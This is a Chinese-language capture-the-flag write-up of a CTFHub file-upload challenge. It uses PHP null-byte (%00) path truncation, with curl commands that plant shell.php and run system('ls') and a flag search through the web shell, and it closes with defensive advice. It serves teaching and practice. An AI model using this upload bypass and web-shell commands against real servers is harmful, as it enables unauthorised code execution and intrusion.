---
title: CTFHub 文件上传-00截断
date: 2026-10-21
categories: CTFHub Web 文件上传
tags:  CTFHub Web 文件上传
---
# 题目：CTFHub 文件上传-00截断

## 题目描述
题目允许上传文件，并且地址栏有一个参数 `?road=` 可以控制上传目录。查看后端源码（F12 查看网页源代码或通过伪协议读取）发现：
```php
$des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
```
服务器会自动在上传目录后追加随机数和时间戳，防止文件名冲突或被直接预测。即使你传了 shell.jpg，也会被重命名为 123456789.jpg。

## 解题思路
### 漏洞原理
在 PHP 5.3.4 之前的版本中，move_uploaded_file() 函数遇到路径中的空字符 %00 时，会认为字符串已经结束，从而丢弃后面的内容（也就是随机数和时间戳）。

### 攻击链
1. 构造带 %00 的 GET 参数：?road=/var/www/html/upload/shell.php%00。
结合 submit 参数发送 POST 上传请求。
服务器截断路径，将文件保存为 shell.php。

2. 连接木马，执行命令。

## 解题步骤
1. 分析源码
查看页面源码，确认变量拼接逻辑：
```php
$des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
```

2. 用 cURL 上传并截断
打开cmd,使用 curl 命令直接发送请求，利用 %00 截断（注意必须带上 submit 参数）：
```cmd
curl -X POST "http://challenge-xxx.sandbox.ctfhub.com:10800/?road=/var/www/html/upload/shell.php%00" -F "file=@shell.jpg;type=image/jpeg" -F "submit=Submit"
```
返回结果：
```html
<script>alert('上传成功');</script>
```

3. 验证木马并读取 Flag
此时木马已经被截断保存为 shell.php。
```cmd
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.php -d "cmd=system('ls');"
```
确认木马执行后，全盘搜索 flag：
```cmd
curl -X POST http://challenge-xxx.sandbox.ctfhub.com:10800/upload/shell.php -d "cmd=system('find / -name flag* 2>/dev/null');"
```
找到 /var/www/html/flag_xxx.php 后 cat 读取即可。

## 踩坑指南
1. 忘记加 submit 参数
原因： 源码中 if (!empty($_POST['submit'])) 决定了必须带上提交参数才会执行。
解决： 在 curl 命令中加上 -F "submit=Submit"。

2. 在 F12 控制台直接传 shell.php 被拦截
原因： 页面前端可能有检测，后端白名单只允许 jpg、png、gif。
解决： 本地文件依然命名为 shell.jpg，通过 GET 参数截断来覆盖保存路径。

## 知识点总结
| 知识点 | 说明 |
| :--- | :--- |
| %00 截断 | 空字符截断，PHP 底层 C 语言处理字符串时的特性 |
| move_uploaded_file | 处理上传文件的 PHP 函数 |
| 源码审计 | 通过阅读后端逻辑，找到漏洞触发点 |

### 防御建议
1. 升级 PHP 版本：PHP 5.3.4 及以上版本已修复此漏洞。
2. 不信任用户输入：不要直接使用 $_GET 或 $_POST 作为文件路径。
3. 重命名文件：使用服务端生成的随机文件名，不使用用户可控的参数。
